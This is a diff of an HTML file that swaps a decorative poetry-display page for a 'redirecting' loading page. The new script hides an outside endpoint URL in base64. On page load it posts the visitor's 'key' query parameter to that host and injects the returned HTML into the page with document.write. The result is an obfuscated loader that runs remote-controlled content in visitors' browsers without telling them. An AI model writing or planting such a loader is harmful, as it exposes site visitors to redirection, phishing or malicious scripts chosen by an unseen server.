@@ -1,172 +1,159 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>诗词展示</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            font-family: "Microsoft YaHei", sans-serif;
-            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            color: white;
-            text-align: center;
-            overflow: hidden;
-        }
-        
-        @keyframes gradientBG {
-            0% {
-                background-position: 0% 50%;
-            }
-            50% {
-                background-position: 100% 50%;
-            }
-            100% {
-                background-position: 0% 50%;
-            }
-        }
-        
-        .poem-container {
-            font-size: 2.2rem;
-            font-weight: bold;
-            margin-bottom: 2rem;
-            min-height: 8rem;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-            width: 80%;
-            max-width: 800px;
-            position: relative;
-        }
-        
-        .slogan {
-            font-size: 2rem;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-            animation: pulse 2s infinite;
-            margin-top: 1rem;
-        }
-        
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.05);
-            }
-            100% {
-                transform: scale(1);
-            }
-        }
-        
-        .poem-line {
-            position: absolute;
-            width: 100%;
-            left: 0;
-            opacity: 0;
-            transform: translateY(20px);
-            transition: all 0.8s ease;
-            pointer-events: none;
-        }
-        
-        .poem-line.active {
-            opacity: 1;
-            transform: translateY(0);
-        }
-    </style>
+  <title>跳转中...</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+  <style>
+    * {
+      margin: 0px;
+      padding: 0px;
+      border: 0px;
+    }
+    html, body {
+      min-height: 100%;
+    }
+    body {
+      background: #f8f8f8;
+    }
+    .loader {
+      position: absolute;
+      top: 0px;
+      bottom: 0px;
+      left: 0px;
+      right: 0px;
+      margin: auto;
+      width: 175px;
+      height: 100px;
+    }
+    .loader span {
+      display: block;
+      background: #fcb34f;
+      width: 7px;
+      height: 10%;
+      border-radius: 14px;
+      margin-right: 5px;
+      float: left;
+      margin-top: 25%;
+    }
+    .loader span:last-child {
+      margin-right: 0px;
+    }
+    .loader span:nth-child(1) {
+      animation: load 2.5s 1.4s infinite linear;
+    }
+    .loader span:nth-child(2) {
+      animation: load 2.5s 1.2s infinite linear;
+    }
+    .loader span:nth-child(3) {
+      animation: load 2.5s 1s infinite linear;
+    }
+    .loader span:nth-child(4) {
+      animation: load 2.5s 0.8s infinite linear;
+    }
+    .loader span:nth-child(5) {
+      animation: load 2.5s 0.6s infinite linear;
+    }
+    .loader span:nth-child(6) {
+      animation: load 2.5s 0.4s infinite linear;
+    }
+    .loader span:nth-child(7) {
+      animation: load 2.5s 0.2s infinite linear;
+    }
+    .loader span:nth-child(8) {
+      animation: load 2.5s 0s infinite linear;
+    }
+    .loader span:nth-child(9) {
+      animation: load 2.5s 0.2s infinite linear;
+    }
+    .loader span:nth-child(10) {
+      animation: load 2.5s 0.4s infinite linear;
+    }
+    .loader span:nth-child(11) {
+      animation: load 2.5s 0.6s infinite linear;
+    }
+    .loader span:nth-child(12) {
+      animation: load 2.5s 0.8s infinite linear;
+    }
+    .loader span:nth-child(13) {
+      animation: load 2.5s 1s infinite linear;
+    }
+    .loader span:nth-child(14) {
+      animation: load 2.5s 1.2s infinite linear;
+    }
+    .loader span:nth-child(15) {
+      animation: load 2.5s 1.4s infinite linear;
+    }
+    @keyframes load {
+      0% {
+        background: #fcb34f;
+        margin-top: 25%;
+        height: 10%;
+      }
+      50% {
+        background: #ff840b;
+        height: 100%;
+        margin-top: 0%;
+      }
+      100% {
+        background: #ff840b;
+        height: 10%;
+        margin-top: 25%;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="poem-container" id="poemContainer">
-        <!-- 诗词行将通过JavaScript动态添加 -->
-    </div>
-    
-    <div class="slogan">影子商人·做你想不到的！</div>
+<div class="loader">
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+</div>
+  <script>
+    const apiUrl = "aHR0cHM6Ly9tbWlmYWguY29tL2FwaS91cmw=";
 
-    <script>
-        // 经典诗词数组
-        const poems = [
-            "床前明月光，疑是地上霜。",
-            "春眠不觉晓，处处闻啼鸟。",
-            "白日依山尽，黄河入海流。",
-            "红豆生南国，春来发几枝。",
-            "海上生明月，天涯共此时。",
-            "会当凌绝顶，一览众山小。",
-            "大漠孤烟直，长河落日圆。",
-            "欲穷千里目，更上一层楼。",
-            "野火烧不尽，春风吹又生。",
-            "举头望明月，低头思故乡。"
-        ];
-        
-        const container = document.getElementById('poemContainer');
-        let currentLines = [];
-        let activeIndex = 0;
-        
-        // 创建诗词行元素
-        function createPoemLines() {
-            // 清空容器
-            container.innerHTML = '';
-            currentLines = [];
-            
-            // 随机选择1-5句诗词
-            const count = Math.floor(Math.random() * 5) + 1;
-            const selectedPoems = getRandomPoems(count);
-            
-            // 创建并添加诗词行
-            selectedPoems.forEach((poem, index) => {
-                const line = document.createElement('div');
-                line.className = 'poem-line';
-                line.textContent = poem;
-                line.style.top = `${index * 100}px`;
-                container.appendChild(line);
-                currentLines.push(line);
-            });
-            
-            // 激活第一行
-            if (currentLines.length > 0) {
-                currentLines[0].classList.add('active');
-            }
-            
-            // 开始轮播
-            startRotation();
-        }
-        
-        // 随机选择诗词
-        function getRandomPoems(count) {
-            const shuffled = [...poems].sort(() => 0.5 - Math.random());
-            return shuffled.slice(0, count);
-        }
-        
-        // 开始轮播
-        function startRotation() {
-            if (currentLines.length === 0) return;
-            
-            const interval = setInterval(() => {
-                // 淡出当前行
-                currentLines[activeIndex].classList.remove('active');
-                
-                // 移动到下一行
-                activeIndex = (activeIndex + 1) % currentLines.length;
-                
-                // 淡入新行
-                currentLines[activeIndex].classList.add('active');
-                
-                // 如果是最后一行，准备下一组诗词
-                if (activeIndex === currentLines.length - 1) {
-                    setTimeout(() => {
-                        clearInterval(interval);
-                        setTimeout(createPoemLines, 2000); // 2秒后切换新诗词
-                    }, 3000);
-                }
-            }, 3000); // 每3秒切换一次
-        }
-        
-        // 初始加载
-        window.onload = createPoemLines;
-    </script>
+    function getQueryString(name) {
+      const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+      const r = window.location.search.substr(1).match(reg);
+      return r ? decodeURIComponent(r[2]) : null;
+    }
+
+    window.onload = async function() {
+      const key = getQueryString("key");
+      const decodedApiUrl = atob(apiUrl); 
+
+      try {
+        const response = await fetch(decodedApiUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: `key=${encodeURIComponent(key)}`
+        });
+
+        const html = await response.text();
+
+        setTimeout(() => {
+          document.write(html);
+        }, 200);
+
+      } catch (error) {
+        console.error('请求失败:', error);
+      }
+    };
+  </script>
 </body>
 </html>
